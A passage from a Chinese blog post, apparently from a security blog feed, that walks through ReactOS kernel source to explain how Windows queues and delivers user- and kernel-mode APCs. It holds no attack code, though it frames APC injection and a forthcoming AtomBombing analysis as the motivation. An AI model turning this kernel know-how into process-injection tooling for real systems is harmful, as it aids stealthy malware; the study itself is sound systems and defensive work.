<p>KTHREAD的ApcStatePointer[2]字段保存了两个ApcState的指针</p>
<p>具体看下面的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">KeAttachProcess-&gt;</span><br><span class="line">VOID</span><br><span class="line">NTAPI</span><br><span class="line">KiAttachProcess(IN PKTHREAD Thread,</span><br><span class="line">                IN PKPROCESS Process,</span><br><span class="line">                IN PKLOCK_QUEUE_HANDLE ApcLock,</span><br><span class="line">                IN PRKAPC_STATE SavedApcState //&amp;Thread-&gt;SavedApcThread</span><br><span class="line">                )</span><br><span class="line">&#123;</span><br><span class="line">/* Swap the APC Environment */</span><br><span class="line">    KiMoveApcState(&amp;Thread-&gt;ApcState, SavedApcState); //把当前ApcState保存到SavedApcState</span><br><span class="line"></span><br><span class="line">    /* Reinitialize Apc State */</span><br><span class="line">    InitializeListHead(&amp;Thread-&gt;ApcState.ApcListHead[KernelMode]);</span><br><span class="line">    InitializeListHead(&amp;Thread-&gt;ApcState.ApcListHead[UserMode]);</span><br><span class="line">    Thread-&gt;ApcState.Process = Process;</span><br><span class="line">    Thread-&gt;ApcState.KernelApcInProgress = FALSE;</span><br><span class="line">    Thread-&gt;ApcState.KernelApcPending = FALSE;</span><br><span class="line">    Thread-&gt;ApcState.UserApcPending = FALSE;</span><br><span class="line"></span><br><span class="line">    /* Update Environment Pointers if needed*/</span><br><span class="line">    if (SavedApcState == &amp;Thread-&gt;SavedApcState)</span><br><span class="line">    &#123;</span><br><span class="line">        Thread-&gt;ApcStatePointer[OriginalApcEnvironment] = &amp;Thread-&gt;</span><br><span class="line">                                                          SavedApcState;//</span><br><span class="line">        Thread-&gt;ApcStatePointer[AttachedApcEnvironment] = &amp;Thread-&gt;ApcState;</span><br><span class="line">        Thread-&gt;ApcStateIndex = AttachedApcEnvironment; //index变成了AttachedApcEnvironment</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>来一个结构图</p>
<p><img src="/img/apc.png" alt="img"></p>
<h1 id="上菜吃饭"><a href="#上菜吃饭" class="headerlink" title="上菜吃饭"></a>上菜吃饭</h1><p>Apc已经点了，什么时候才能端上来呢？我们接着看…</p>
<h2 id="Apc投递"><a href="#Apc投递" class="headerlink" title="Apc投递"></a>Apc投递</h2><blockquote>
<p>线程wait、线程切换到应用层、线程被挂起等，一旦线程有空隙了，windows就会把apc队列顺便执行一遍</p>
</blockquote>
<p>搜索<code>NormalRoutine</code>和<code>KernelRoutine</code>字段，找到<code>KiDeliverApc</code>，这个函数是具体分发Apc的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line">NTAPI</span><br><span class="line">KiDeliverApc(IN KPROCESSOR_MODE DeliveryMode,</span><br><span class="line">             IN PKEXCEPTION_FRAME ExceptionFrame,</span><br><span class="line">             IN PKTRAP_FRAME TrapFrame)</span><br><span class="line">             </span><br><span class="line"> * @remarks First, Special APCs are delivered, followed by Kernel-Mode APCs and</span><br><span class="line"> *          User-Mode APCs. Note that the TrapFrame is only valid if the</span><br><span class="line"> *          delivery mode is User-Mode.</span><br><span class="line"> *          Upon entry, this routine executes at APC_LEVEL.</span><br></pre></td></tr></table></figure>
<p>那在哪里调用的KiDeliverApc的呢，找到多处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//hal\halx86\generic\irq.S</span><br><span class="line">.globl _HalpApcInterrupt2ndEntry</span><br><span class="line">.func HalpApcInterrupt2ndEntry]</span><br><span class="line"></span><br><span class="line">//hal\halx86\generic\irql.c</span><br><span class="line">VOID HalpLowerIrql(KIRQL NewIrql)；</span><br><span class="line"></span><br><span class="line">//暂时忽略上面两个了</span><br><span class="line"></span><br><span class="line">//ke\i386\trap.s</span><br><span class="line">.func KiServiceExit</span><br><span class="line">_KiServiceExit:</span><br><span class="line">    /* Disable interrupts */</span><br><span class="line">    cli</span><br><span class="line"></span><br><span class="line">    /* Check for, and deliver, User-Mode APCs if needed */</span><br><span class="line">    CHECK_FOR_APC_DELIVER 1 //</span><br><span class="line"></span><br><span class="line">    /* Exit and cleanup */</span><br><span class="line">    TRAP_EPILOG FromSystemCall, DoRestorePreviousMode, DoNotRestoreSegments, DoNotRestoreVolatiles, DoRestoreEverything</span><br><span class="line">.endfunc</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根据《windows内核情景分析》介绍, 执行用户APC的时机在从内核返回用户空间的途中（可能是系统调用、中断、异常处理之后需要返回用户空间）</p>
</blockquote>
<p>也就是肯定会经过<code>_KiServiceExit</code>，那就跟着来看看吧。</p>
<ol>
<li><code>CHECK_FOR_APC_DELIVER</code>宏 检查是不是需要投递Apc，具体检查trapframe是不是指向返回用户模式的，是则继续检查用户模式Apc是否需要投递。<br>参数：<code>ebp = PKTRAP_FRAME</code>，PreserveEax</li>
</ol>
<ul>
<li>trap_frame.Eflags == EFLAGS_V86_MASK，运行在V86模式，不检查是否是用户模式的trap_frame</li>
<li>trap_frame.Segcs != 1（KernelMode），表示是用户模式</li>
<li>kthread = PCR[KPCR_CURRENT_THREAD]，kthread.alerted = 0，置为不可唤醒</li>
<li>kthread-&gt;ApcState.UserApcPending 是FALSE，啥也不做，TRUE才进行投递</li>
<li>如果PreserveEax=1，保存eax，保存一些IRQL提升会清除的信息到trap_frame，fs，ds，es，gs</li>
<li>提示irql到APC_LEVEL</li>
<li>调用KiDeliverApc(UserMode, 0, trap_frame);</li>
<li>恢复irql</li>
<li>如果PreserveEax=1，恢复eax</li>
</ul>
<ol>
<li><code>TRAP_EPILOG</code>是自陷处理，参数：<code>ebp = PKTRAP_FRAME</code><blockquote>
<p>// This macro creates an epilogue for leaving any system trap.<br>// It is used for exiting system calls, exceptions, interrupts and generic<br>// traps.</p>
</blockquote>
</li>
</ol>
<ul>
<li>通过TrapFrame恢复一堆寄存器、堆栈信息，然后sysexit回到用户态空间</li>
</ul>
<p>继续看一下调用<code>KiDeliverApc</code>内部究竟是怎么处理的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">KiDeliverApc(IN KPROCESSOR_MODE DeliveryMode,</span><br><span class="line">             IN PKEXCEPTION_FRAME ExceptionFrame,</span><br><span class="line">             IN PKTRAP_FRAME TrapFrame) //系统空间堆栈的“自陷框架”</span><br><span class="line">&#123;</span><br><span class="line">//1. 保存原来的trap_frame</span><br><span class="line">OldTrapFrame = Thread-&gt;TrapFrame;</span><br><span class="line">Thread-&gt;TrapFrame = TrapFrame;</span><br><span class="line"></span><br><span class="line">/* Clear Kernel APC Pending */</span><br><span class="line">Thread-&gt;ApcState.KernelApcPending = FALSE;</span><br><span class="line">/* Check if Special APCs are disabled */</span><br><span class="line">if (Thread-&gt;SpecialApcDisable) goto Quickie;</span><br><span class="line"></span><br><span class="line">//2. 先投递内核Apc，循环投递队列中所有的内核apc，不涉及切换到用户空间</span><br><span class="line">while (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[KernelMode]))</span><br><span class="line">&#123;</span><br><span class="line">    //Thread-&gt;ApcQueueLock加锁访问</span><br><span class="line">    //取出一个Apc</span><br><span class="line">    ApcListEntry = Thread-&gt;ApcState.ApcListHead[KernelMode].Flink;</span><br><span class="line">    Apc = CONTAINING_RECORD(ApcListEntry, KAPC, ApcListEntry);</span><br><span class="line">    NormalRoutine = Apc-&gt;NormalRoutine;</span><br><span class="line">    KernelRoutine = Apc-&gt;KernelRoutine;</span><br><span class="line">    NormalContext = Apc-&gt;NormalContext;</span><br><span class="line">    SystemArgument1 = Apc-&gt;SystemArgument1;</span><br><span class="line">    SystemArgument2 = Apc-&gt;SystemArgument2;</span><br><span class="line">    </span><br><span class="line">    //特殊Apc，特指内核Apc，但是Apc的NormalRoutine是空的</span><br><span class="line">    if (!NormalRoutine) &#123;</span><br><span class="line">        //将Apc出队列，然通过KernelRoutine调用内核Apc响应函数</span><br><span class="line">        KernelRoutine(Apc,</span><br><span class="line">                          &amp;NormalRoutine,</span><br><span class="line">                          &amp;NormalContext,</span><br><span class="line">                          &amp;SystemArgument1,</span><br><span class="line">                          &amp;SystemArgument2);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //普通的内核Apc</span><br><span class="line">        if ((Thread-&gt;ApcState.KernelApcInProgress) ||</span><br><span class="line">                (Thread-&gt;KernelApcDisable))</span><br><span class="line">            &#123; //退出，必须安全才会投递</span><br><span class="line">            &#125;</span><br><span class="line">        ////将Apc出队列，然通过KernelRoutine调用内核Apc响应函数</span><br><span class="line">        KernelRoutine(Apc,</span><br><span class="line">                          &amp;NormalRoutine, //内部可能修改NormalRoutine</span><br><span class="line">                          &amp;NormalContext,</span><br><span class="line">                          &amp;SystemArgument1,</span><br><span class="line">                          &amp;SystemArgument2);</span><br><span class="line">        </span><br><span class="line">        //如果NormalRoutine依然不为空，在调用NormalRoutine</span><br><span class="line">        if (NormalRoutine)</span><br><span class="line">        &#123;</span><br><span class="line">            /* At Passive Level, an APC can be prempted by a Special APC */</span><br><span class="line">            Thread-&gt;ApcState.KernelApcInProgress = TRUE;</span><br><span class="line">            KeLowerIrql(PASSIVE_LEVEL); //将到PASSIVE_LEVEL执行</span><br><span class="line"></span><br><span class="line">            /* Call and Raise IRQ back to APC_LEVEL */</span><br><span class="line">            NormalRoutine(NormalContext, SystemArgument1, SystemArgument2);</span><br><span class="line">            KeRaiseIrql(APC_LEVEL, &amp;ApcLock.OldIrql);</span><br><span class="line">        &#125;</span><br><span class="line">        Thread-&gt;ApcState.KernelApcInProgress = FALSE;</span><br><span class="line">        //继续循环</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//3. 投递完内核apc，如果KiDeliverApc目标是用户apc，那么继续投递用户apc</span><br><span class="line">//每次值投递一个User mode Apc</span><br><span class="line">if ((DeliveryMode == UserMode) &amp;&amp;</span><br><span class="line">        !(IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode])) &amp;&amp;</span><br><span class="line">         (Thread-&gt;ApcState.UserApcPending)) //TRUE  </span><br><span class="line">&#123;</span><br><span class="line">    Thread-&gt;ApcState.UserApcPending = FALSE;</span><br><span class="line">    //取出第一个Apc</span><br><span class="line">    //先调用他的KernelRoutine</span><br><span class="line">    KernelRoutine(Apc,</span><br><span class="line">                  &amp;NormalRoutine,</span><br><span class="line">                  &amp;NormalContext,</span><br><span class="line">                  &amp;SystemArgument1,</span><br><span class="line">                  &amp;SystemArgument2);</span><br><span class="line">    /* Check if there&apos;s no normal routine */</span><br><span class="line">    if (!NormalRoutine)</span><br><span class="line">    &#123;</span><br><span class="line">        /* Check if more User APCs are Pending */</span><br><span class="line">        KeTestAlertThread(UserMode);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        /* Set up the Trap Frame and prepare for Execution in NTDLL.DLL */</span><br><span class="line">        //不是直接调用NormalRoutine，因为他是用户太的函数，需要切换到用户空间才能执行</span><br><span class="line">        KiInitializeUserApc(ExceptionFrame,</span><br><span class="line">                            TrapFrame,</span><br><span class="line">                            NormalRoutine,</span><br><span class="line">                            NormalContext,</span><br><span class="line">                            SystemArgument1,</span><br><span class="line">                            SystemArgument2);</span><br><span class="line">    &#125;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据注释应该很清楚deliver的逻辑了，还是在看张图<br><img src="/img/KiDeliverApc.png" alt="img"></p>
<p><code>CHECK_FOR_APC_DELIVER</code>用户态Apc的delvier有个重点，Thread-&gt;ApcState.UserApcPending必须是TRUE，那什么时候才会是TRUE，我蛮来看看</p>
<ol>
<li>在KiInsertQueueApc，如果线程等待，且Alertable是TRUE<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">else if ((Thread-&gt;State == Waiting) &amp;&amp;</span><br><span class="line">                     (Thread-&gt;WaitMode == UserMode) &amp;&amp;</span><br><span class="line">                     ((Thread-&gt;Alertable) || //</span><br><span class="line">                      (Thread-&gt;ApcState.UserApcPending)))</span><br><span class="line">            &#123;</span><br><span class="line">                /* Set user-mode APC pending */</span><br><span class="line">                Thread-&gt;ApcState.UserApcPending = TRUE;</span><br><span class="line">                Status = STATUS_USER_APC;</span><br><span class="line">                goto Unwait;</span><br><span class="line">            &#125;</span><br><span class="line">```            </span><br><span class="line">2. KiCheckAlertability中(wrk中是TestForAlertPending)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>FORCEINLINE<br>NTSTATUS<br>KiCheckAlertability(IN PKTHREAD Thread,<br>                    IN BOOLEAN Alertable,<br>                    IN KPROCESSOR_MODE WaitMode)<br>{<br>    /<em> Check if the wait is alertable </em>/<br>    if (Alertable)<br>    {<br>        /<em> It is, first check if the thread is alerted in this mode </em>/<br>        if (Thread-&gt;Alerted[WaitMode])<br>        {<br>            /<em> It is, so bail out of the wait </em>/<br>            Thread-&gt;Alerted[WaitMode] = FALSE;<br>            return STATUS_ALERTED;<br>        }<br>        else if ((WaitMode != KernelMode) &amp;&amp;<br>                (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode])))<br>        {<br>            /<em> It’s isn’t, but this is a user wait with queued user APCs </em>/<br>            Thread-&gt;ApcState.UserApcPending = TRUE;<br>            return STATUS_USER_APC;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">两种情况都需要Alertable = TRUE，这个字段表示线程是唤醒的，也就是说只有可唤醒的线程，才能拿投递他的用态APC，否则不会</span><br><span class="line"></span><br><span class="line">&gt; SleepEx, WaitForSingleObject，WaitForMultipleObjects都可以设置线程为Alertable</span><br><span class="line"></span><br><span class="line">接着继续看看`KiInitializeUserApc`是怎么切换到用户空间执行的用户态函数</span><br></pre></td></tr></table></figure></p>
<p>VOID<br>NTAPI<br>KiInitializeUserApc(IN PKEXCEPTION_FRAME ExceptionFrame,<br>                    IN PKTRAP_FRAME TrapFrame,<br>                    IN PKNORMAL_ROUTINE NormalRoutine,<br>                    IN PVOID NormalContext,<br>                    IN PVOID SystemArgument1,<br>                    IN PVOID SystemArgument2)<br>{</p>
<pre><code>//V86模式下，不投递

 /* Save the full context */
Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
KeTrapFrameToContext(TrapFrame, ExceptionFrame, &amp;Context);

//检查不是KernleMode
ASSERT((TrapFrame-&gt;SegCs &amp; MODE_MASK) != KernelMode);

...

/* Get the aligned size */
AlignedEsp = Context.Esp &amp; ~3;//来自于TrapFrame.HardwareEsp或TempEsp
//Context和4个参数的长度
ContextLength = CONTEXT_ALIGNED_SIZE + (4 * sizeof(ULONG_PTR));
//将原始堆栈扩展ContextLength，用来保存Context和参数
Stack = ((AlignedEsp - 8) &amp; ~3) - ContextLength;

/* Probe the stack */
ProbeForWrite((PVOID)Stack, AlignedEsp - Stack, 1);
ASSERT(!(Stack &amp; 3));

/* Copy data into it */
//(4 * sizeof(ULONG_PTR)))是后面4个参数的位置，然后接着拷贝Context，将老的TrapFrame内容拷贝到用户太堆栈中
RtlCopyMemory((PVOID)(Stack + (4 * sizeof(ULONG_PTR))),
              &amp;Context,
              sizeof(CONTEXT));

/* Run at APC dispatcher */
TrapFrame-&gt;Eip = (ULONG)KeUserApcDispatcher; //KeUserApcDispatcher保存的其实就是KiUserApcDispatcher，是用户空间函数
TrapFrame-&gt;HardwareEsp = Stack;//栈顶

/* Setup Ring 3 state */
TrapFrame-&gt;SegCs = Ke386SanitizeSeg(KGDT_R3_CODE, UserMode);
TrapFrame-&gt;HardwareSegSs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode);
TrapFrame-&gt;SegDs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode);
TrapFrame-&gt;SegEs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode);
TrapFrame-&gt;SegFs = Ke386SanitizeSeg(KGDT_R3_TEB, UserMode);
TrapFrame-&gt;SegGs = 0;
TrapFrame-&gt;ErrCode = 0;

/* Sanitize EFLAGS */
TrapFrame-&gt;EFlags = Ke386SanitizeFlags(Context.EFlags, UserMode);

/* Check if thread has IOPL and force it enabled if so */
if (KeGetCurrentThread()-&gt;Iopl) TrapFrame-&gt;EFlags |= 0x3000;

/* Setup the stack */
*(PULONG_PTR)(Stack + 0 * sizeof(ULONG_PTR)) = (ULONG_PTR)NormalRoutine;
*(PULONG_PTR)(Stack + 1 * sizeof(ULONG_PTR)) = (ULONG_PTR)NormalContext;
*(PULONG_PTR)(Stack + 2 * sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument1;
*(PULONG_PTR)(Stack + 3 * sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument2;
...
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">执行流程根据注释应该很清楚了，这里要解释一下TrapFrame。</span><br><span class="line">&gt; CPU进入啮合之后，内核堆栈就会有个TrapFrame，保存的是用户空间的线程（因进入内核原因不同，可能是自陷、中断、异常框架，都是一样的结构）。CPU返回用户空间时会使用这个TrapFrame，才能正确返回原理啊的断点，并回复寄存器的状态</span><br><span class="line">&gt; 这里为了让Apc返回到用户空间执行，就会修改这个TrapFrame，原来的TrapFrame就需要保存，这里保存在了用户空间堆栈中（CONTEXT)</span><br><span class="line">&gt; 执行完Apc函数之后，执行一个NtContinue，将这个CONTEXT作为参数，这样保存的TrapFrame就会还原到原来的状态，然后CPU又能正常回之前的用户空间了。</span><br><span class="line"></span><br><span class="line">KiDeliverApc完了之后，回到_KiServiceExit，会使用被修改过的TrapFrame回到用户空间，执行指定的`KiUserApcDispatcher`(ntdll提供)</span><br></pre></td></tr></table></figure></p>
<p>//更具这个执行KiUserApcDispatcher<br>TrapFrame-&gt;Eip = (ULONG)KeUserApcDispatcher; //其实就是KiUserApcDispatcher，是用户空间函数<br>TrapFrame-&gt;HardwareEsp = Stack;//栈顶</p>
<p>.func KiUserApcDispatcher@16<br>.globl _KiUserApcDispatcher@16<br>_KiUserApcDispatcher@16:</p>
<pre><code>/* Setup SEH stack */
lea eax, [esp+CONTEXT_ALIGNED_SIZE+16];原始堆栈的位置，SEH
mov ecx, fs:[TEB_EXCEPTION_LIST]
mov edx, offset _KiUserApcExceptionHandler
mov [eax], ecx
mov [eax+4], edx

/* Enable SEH */
mov fs:[TEB_EXCEPTION_LIST], eax

/* Put the Context in EDI */
pop eax;弹出第一个参数
lea edi, [esp+12];context的位置

/* Call the APC Routine */
call eax //调用IntCallUserApc

/* Restore exception list */
mov ecx, [edi+CONTEXT_ALIGNED_SIZE]
mov fs:[TEB_EXCEPTION_LIST], ecx

/* Switch back to the context */
push 1
push edi;Context
call _ZwContinue@8 //正常是不会返回的

/* Save callback return value */
mov esi, eax

/* Raise status */
</code></pre><p>StatusRaiseApc:<br>    push esi<br>    call _RtlRaiseStatus@4 //如果ZwContinue失败了，这里处理<br>    jmp StatusRaiseApc<br>    ret 16<br>.endfunc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`KiUserApcDispatcher`其实挺简单的，通过esp弹出APc函数，然后调用，就进入了IntCallUserApc，</span><br><span class="line"></span><br><span class="line">## 恢复TrapFrame</span><br><span class="line"></span><br><span class="line">执行完成后，调用_ZwContinue(Context, 1)，回到内核回复之前修改TrapFrame，也会重新检查是否有Apc需要投递，有则继续投递，</span><br><span class="line">重复上面的步骤，直到没有了则可以回到之前被中断的用户态的断点处。</span><br></pre></td></tr></table></figure></p>
<p>.func NtContinue@8<br>_NtContinue@8:</p>
<pre><code>/* NOTE: We -must- be called by Zw* to have the right frame! */
/* Push the stack frame */
push ebp ; 指向本次调用的自陷框架，记为T1

/* Get the current thread and restore its trap frame */
mov ebx, PCR[KPCR_CURRENT_THREAD]
mov edx, [ebp+KTRAP_FRAME_EDX]
mov [ebx+KTHREAD_TRAP_FRAME], edx;thread-&gt;TrapFrame = edx

/* Set up stack frame */
mov ebp, esp ; ESP指向新的框架（函数调用框架）

/* Save the parameters */
mov eax, [ebp+0] ; 原来的EBP，就是自陷框架指针，就是T1
mov ecx, [ebp+8] ; Context

/* Call KiContinue */
push eax ;TrapFrame
push 0 ;ExceptionFrame
push ecx ;Context
call _KiContinue@12 ; 将Context恢复到T1中

/* Check if we failed (bad context record) */
or eax, eax
jnz Error

/* Check if test alert was requested */
cmp dword ptr [ebp+12], 0
je DontTest

/* Test alert for the thread */
mov al, [ebx+KTHREAD_PREVIOUS_MODE]
push eax
call _KeTestAlertThread@4 ; 检查用户模式APC队列是否为空，不空将UserApcPending置为TRUE
</code></pre><p>DontTest:<br>    /<em> Return to previous context </em>/<br>    pop ebp<br>    mov esp, ebp<br>    jmp _KiServiceExit2 ; 本质和_KiServiceExit相同，如果还有用户APC，会继续投递，直到投递完，才会回到用户被中断的点</p>
<p>Error:<br>    pop ebp<br>    mov esp, ebp<br>    jmp _KiServiceExit<br>.endfunc</p>
<p>```</p>
<p>下面将_KiServiceExit到IntCallUserApc的流程总结一下：<br><img src="/img/deliver.png" alt="img"></p>
<p>到这里，终于执行到了用户的Apc函数。</p>
<h1 id="结账走人"><a href="#结账走人" class="headerlink" title="结账走人"></a>结账走人</h1><p>到这，APC流程基本弄清楚了。</p>
<p>下一篇将结合APC机制分析一下最近比较新的AtomBombing注入技术的详细实现和各个细节。</p>
<p><strong>参考</strong></p>
<ol>
<li><a href="">Reactos内核情景源码分析</a></li>
<li><a href="http://bbs.pediy.com/thread-209377.htm" target="_blank" rel="noopener">线程的Alertable与User APC</a></li>
</ol>
<p>转载请注明出处，博客原文：<a href="http://anhkgg.github.io/win-apc-analyze1/">http://anhkgg.github.io/win-apc-analyze1/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;翻开&quot;&gt;&lt;a href=&quot;#翻开&quot; class=&quot;headerlink&quot; title=&quot;翻开&quot;&gt;&lt;/a&gt;翻开&lt;/h1&gt;&lt;p&gt;翻开小Win的菜单，APC赫然在目…&lt;/p&gt;
&lt;p&gt;做工讲究，味道不错，是小Win的热门菜，我们点一来尝尝！&lt;/p&gt;
&lt;p&gt;吃了可以做很多事情…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;APC注入&lt;/li&gt;
&lt;li&gt;APC注入&lt;/li&gt;
&lt;li&gt;APC注入&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
    
    
      <category term="windows" scheme="https://anhkgg.github.io/tags/windows/"/>
    
      <category term="APC" scheme="https://anhkgg.github.io/tags/APC/"/>
    
  </entry>
  
</feed>
